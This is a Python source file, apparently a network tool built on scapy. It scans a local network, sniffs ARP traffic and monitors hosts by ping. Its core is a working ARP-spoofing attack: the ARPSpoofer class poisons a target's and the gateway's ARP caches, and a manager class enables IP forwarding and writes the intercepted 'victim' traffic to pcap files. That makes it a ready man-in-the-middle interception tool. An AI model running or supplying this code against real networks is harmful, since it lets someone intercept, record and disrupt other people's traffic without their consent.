
import time
import random
import socket  
import ipaddress
import netifaces

from scapy.all import sendp, AsyncSniffer, Ether, ARP, srp, IP, ICMP, srp1, sr1, conf, PcapWriter, TCP, UDP

def get_default_interface():
    """Get the correct iface from the OS and fall back to scapy's."""
    try:
        return netifaces.gateways()['default'][netifaces.AF_INET][1]
    except Exception:
        pass
    
    try:
        return str(conf.iface)
    except Exception: 
        return "eth0"

def get_default_gateway(): 
    """Get the gateway's (ip, mac) addresses."""
    ip = None 

    try: 
        ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
    except Exception: 
        pass
    
    if not ip: 
        try:
            ip = conf.route.route("0.0.0.0")[2]
        except Exception: 
            return None 

    try: 
        ans = srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip),
            timeout=2,
            verbose=False
        )
        if ans:
            return (ip, ans[ARP].hwsrc)
    except Exception:  
        return None 

    return None 

def get_local_addresses(iface):
    """Get the user machine's (ip, mac) addresses."""
    try:
        ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]["addr"]
    except Exception:
        ip =  "0.0.0.0"

    try:
        mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]["addr"]
    except Exception:
        mac = "00:00:00:00:00:00"

    return (ip, mac)

def get_subnet(ip, iface): 
    """Get the user machine's subnet."""
    try:
        netmask = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['netmask']
    except Exception:
        return "255.255.255.0"

    try:
        subnet = str(ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False))
    except Exception:
        return None

    return subnet

def get_forwarding_state(): 
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            return f.read()
    except Exception as e:
        raise e


class Pinger:
    """Class for the backend used for pinging."""
    def __init__(self, ping_callback):
        self.callback = ping_callback
        self.running = False

    def start(self, ip: str): 
        self.running = True
        self.callback("LOG", {"message": f"Started ping monitoring for {ip}..."})

        while self.running: 
            ans = sr1(IP(dst=ip)/ICMP(), timeout=3, verbose=False) 

            if ans:
                self.callback("UP", {
                    "ip": ip, 
                    "timestamp": time.strftime("%H:%M:%S"), 
                })
            else: 
                self.callback("DOWN", {
                    "ip": ip,
                    "timestamp": time.strftime("%H:%M:%S"), 
                })

            time.sleep(2.0)

        self.callback("LOG", {"message": f"Stopped ping monitoring for {ip}."})

    def stop(self):
        self.running = False


class ReverseDNS:
    """Class for the backend used for resolving ips."""
    def __init__(self, hostname_callback):
        self.callback = hostname_callback
        self.running = True

    def start(self, ip: str): 
        self.running = True
        try: 
            hostname, _, _ = socket.gethostbyaddr(ip)
            self.callback("HOSTNAME", {"hostname": hostname, "ip": ip})
        except socket.error:
            self.callback("UNKNOWN", {"ip": ip})

    def stop(self):
        self.running = False


class ARPBase: 
    """Base class for other ARP based classes."""
    def __init__(self, packet_callback, iface, local_ip, local_mac):
        self.callback = packet_callback
        self.iface = iface

        self.local_ip = local_ip
        self.local_mac = local_mac

    def stop(self):
        pass

    def process_packet(self, packet):
        if not packet.haslayer(ARP):
            return

        arp_layer = packet[ARP]
        ip = arp_layer.psrc
        mac = arp_layer.hwsrc

        if ip in ["0.0.0.0", self.local_ip] or mac in ["00:00:00:00:00:00", self.local_mac]:
            return 

        self.callback("PACKET", {
            "ip": ip, 
            "mac": mac, 
            "timestamp": time.strftime("%H:%M:%S"), 
            "type": "REQ" if arp_layer.op == 1 else "RPL"
        })

        # Store the target ip so we can query for it later 
        target_ip  = arp_layer.pdst
        if target_ip != self.local_ip: 
            self.callback("PACKET", {
                "ip": arp_layer.pdst, 
                "mac": "?", 
                "timestamp": time.strftime("%H:%M:%S"), 
                "type": "TARGET"
            })

class ARPScanner(ARPBase):
    """Class representing the active ARP broadcast scanner."""
    def __init__(self, packet_callback, iface, local_ip, local_mac, subnet):
        super().__init__(packet_callback, iface, local_ip, local_mac)

        self.subnet = subnet

    def start(self):
        self.callback("LOG", {"message": f"- Started ARP scan @ {self.subnet}..."})

        ans, unans = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.subnet),
            timeout=2,
            iface=self.iface,
            verbose=False
        )

        for _, recv in ans:
            self.process_packet(recv)

        self.callback("LOG", {"message": f"ARPScanner finished. Found {len(ans)} devices."})
            
class ARPSniffer(ARPBase):
    """Class representing the ARP packet sniffer."""
    def __init__(self, packet_callback, iface, local_ip, local_mac):
        super().__init__(packet_callback, iface, local_ip, local_mac)
        self.sniffer = None

    def start(self):
        self.callback("LOG", {"message": "- Listening for ARP packets..."})

        self.sniffer = AsyncSniffer(
                filter="arp",
                prn=self.process_packet,
                store=0,
                promisc=0,
            )
        self.sniffer.start()
        self.sniffer.join()
                
        self.callback("LOG", {"message": "ARPSniffer finished."})

    def stop(self):
        if self.sniffer:
            self.sniffer.stop()


class SpooferManager: 
    """Class that confirms MITM and Spoofing via IP sniffing."""
    def __init__(self, manager_callback, gateway_ip, gateway_mac, local_ip):
        self.callback = manager_callback
        self.active_instances = set()
        self.mitm_count = 0
        self.running = False 
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.sniffer = None
        self.spoof_t = None
        self.original_forwarding = None
        self.forwarding = None 
        self.local_ip = local_ip

        self.pcap_writers = {}

    def register(self, instance, mode):
        self.active_instances.add(instance)

        if mode == "mitm": 
            self.mitm_count += 1
            if not self.forwarding:
                self.set_forwarding(True)

            target_ip = instance.target_ip
            if target_ip not in self.pcap_writers:
                filename = f"mitm_capture_{target_ip.replace(".", "_")}.pcap"
                self.pcap_writers[target_ip] = PcapWriter(filename, append=True, sync=True)

        if not self.running:
            self.running = True

            self.sniffer = AsyncSniffer(
                    filter="ip",
                    prn=self.check_spoof_status,
                    store=0,
                    promisc=0,
                )
            self.sniffer.start()


    def unregister(self, instance):
        self.active_instances.discard(instance)

        if self.forwarding:  
            self.mitm_count -= 1

            target_ip = instance.target_ip
            writer = self.pcap_writers.pop(target_ip, None)
            if writer:
                writer.close()

            if not self.mitm_count: 
                self.set_forwarding(False)

        if not self.active_instances:
            self.running = False 
            if self.sniffer: 
                self.sniffer.stop()

    def check_spoof_status(self, packet):
        if not (packet.haslayer(Ether) and packet.haslayer(IP)): 
            return # ignorning non layer 3 packets 

        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        dst_mac = packet[Ether].dst

        if src_ip == self.local_ip or dst_ip == self.local_ip:
            return
            
        for ip in [src_ip, dst_ip]:
            if ip in self.pcap_writers:
                try:
                    self.pcap_writers[ip].write(packet)
                except Exception:
                    pass

        payload = {
            "victim_ip": src_ip,
            "target_ip": dst_ip,
            "size": len(packet), 
            "timestamp": time.strftime("%H:%M:%S")
        }
        if packet.haslayer("TCP"):
            payload["proto"] = "TCP"
            payload["port"] = packet[TCP].sport
        elif packet.haslayer("UDP"):
            payload["proto"] = "UDP"
            payload["port"] = packet[UDP].sport
        else: 
            payload["proto"] = "IP"
            payload["port"] = 0

        self.callback("MITM_DATA", payload)

        try:
            _, _, routed_ip = conf.route.route(packet[IP].dst)
        except Exception:
            return 

        if routed_ip == self.gateway_ip and dst_mac != self.gateway_mac:
            self.callback("CONFIRMED", {
                "victim_ip": src_ip,
                "target_ip": dst_ip,
                "timestamp": payload["timestamp"]
            })

    def set_forwarding(self, enable):
        try: 
            if not self.original_forwarding:
                self.original_forwarding = get_forwarding_state()
        except Exception as e:
            self.callback("ERROR", {"message", f"Failed to read forwarding permissions: {e}"})
            return 

        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                value = "1" if enable else "0"
                f.write(value) 
                self.forwarding = value
        except Exception as e:
            self.callback("ERROR", {"message": f"Failed to change forwarding permissions: {e}"})
            return


class ARPSpoofer(ARPBase):
    """Class for performing spoofing attacks.""" 
    def __init__(self, iface, local_ip, local_mac, callback, manager: SpooferManager, target_ip, target_mac, gateway_ip, gateway_mac, mode):
        super().__init__(callback, iface, local_ip, local_mac)
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.mode = mode 
        self.manager = manager 
        self.running = False 
    
    def start(self):
        self.running = True 
        self.manager.register(self, self.mode) 

        while self.running: 
            if self.target_ip == self.local_ip or self.target_ip == self.gateway_ip: # just in case
                continue

            try: 
                sendp(Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip), verbose=False)
                if self.mode == "mitm":
                    sendp(Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip), verbose=False)

                time.sleep(random.uniform(1.0, 3.0))
                
            except Exception as e:
                self.running = False 
                self.callback("ERROR", {"message": f"Error while spoofing [{self.target_ip}]: {e}"})

        self.restore_network()

        self.callback("LOG", {"message": f"[{time.strftime("%H:%M:%S")}] Restored the ARP entries @ [{self.target_ip}]"})

    def restore_network(self):
        sendp(Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=False, count=3, inter=0.2)

        if self.mode == "mitm": 
            sendp(Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac), verbose=False, count=3, inter=0.2)

    def stop(self):
        self.running = False
        self.manager.unregister(self)

